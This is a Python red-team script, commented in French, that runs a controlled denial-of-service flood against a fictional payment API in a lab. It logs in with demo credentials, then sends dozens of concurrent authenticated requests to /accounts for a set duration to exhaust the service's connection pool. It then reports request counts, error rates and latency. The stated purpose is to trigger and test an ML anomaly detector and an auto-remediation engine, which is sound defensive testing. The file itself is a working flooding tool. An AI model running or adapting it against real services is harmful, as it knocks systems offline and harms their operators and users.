#!/usr/bin/env python3
"""Scénario Red Team #1 — DoS applicatif contrôlé (épuisement de ressources).

À LANCER DEPUIS LE PC ATTAQUANT UNIQUEMENT, contre le SI fictif de l'équipe (sujet §9).
But : saturer le pool de connexions de payment-api -> pic de latence + erreurs OBSERVABLES,
que le détecteur ML repère et que le moteur de remédiation corrige automatiquement.

Usage :
    python dos_flood.py --target http://192.168.137.1:8080 --concurrency 60 --duration 40
"""
import argparse
import asyncio
import statistics
import time

import httpx

DEMO_USER, DEMO_PASS = "demo", "demo1234"  # identifiants FICTIFS de démo


async def login(target: str) -> str:
    async with httpx.AsyncClient(timeout=5.0) as c:
        r = await c.post(f"{target}/login", json={"username": DEMO_USER, "password": DEMO_PASS})
        # NB : /login est servi par le service auth ; en prod l'URL peut différer.
        if r.status_code != 200:
            raise SystemExit(f"login impossible ({r.status_code}). Démarrez la plateforme d'abord.")
        return r.json()["access_token"]


async def worker(target, token, stop_at, lat, errors, total):
    headers = {"Authorization": f"Bearer {token}"}
    async with httpx.AsyncClient(timeout=5.0) as c:
        while time.perf_counter() < stop_at:
            t0 = time.perf_counter()
            try:
                r = await c.get(f"{target}/accounts", headers=headers)
                lat.append(time.perf_counter() - t0)
                total[0] += 1
                if r.status_code >= 500:
                    errors[0] += 1
            except Exception:
                errors[0] += 1
                total[0] += 1


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True, help="URL du WAF (frontal payment-api)")
    ap.add_argument("--concurrency", type=int, default=60)
    ap.add_argument("--duration", type=int, default=40, help="durée en secondes")
    args = ap.parse_args()

    print(f"[*] Authentification sur {args.target} ...")
    token = await login(args.target)
    print(f"[*] DoS contrôlé : {args.concurrency} workers pendant {args.duration}s")
    print("    (observez le dashboard / Grafana : latence et 5xx doivent grimper,")
    print("     puis le système doit se rétablir SEUL.)")

    lat, errors, total = [], [0], [0]
    stop_at = time.perf_counter() + args.duration
    await asyncio.gather(*[worker(args.target, token, stop_at, lat, errors, total)
                           for _ in range(args.concurrency)])

    if lat:
        p95 = statistics.quantiles(lat, n=20)[-1] if len(lat) > 20 else max(lat)
        print(f"\n[résultat attaquant] requêtes={total[0]} erreurs={errors[0]} "
              f"({100*errors[0]/max(total[0],1):.1f}%) | latence moy={statistics.mean(lat)*1000:.0f}ms "
              f"p95={p95*1000:.0f}ms")
    print("[*] Attaque terminée. La reprise doit être visible dans l'historique de remédiation.")


if __name__ == "__main__":
    asyncio.run(main())
